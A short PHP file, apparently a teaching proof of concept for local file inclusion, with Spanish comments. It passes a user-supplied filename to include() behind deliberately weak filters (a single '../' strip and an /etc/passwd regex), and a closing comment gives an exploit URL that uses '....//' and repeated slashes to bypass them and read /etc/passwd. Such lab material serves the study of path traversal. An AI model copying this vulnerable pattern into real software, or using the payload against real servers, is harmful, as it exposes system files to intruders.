<?php

  $filename = $_GET['filename'];
  $filename = str_replace("../","", $filename); // [ remplaza "../" por "" ]

  if(preg_match("/\/etc\/passwd/", $filename) === 1){
    echo "\n[!] No es posible visualizar el contenido de este archivo\n";
  } else {
    include("/var/www/html/" . $filename);
  }

// exploit: firefox: http://localhost/PoCv4.php?filename=....//....//....//....//....//....//etc///////passwd

?>

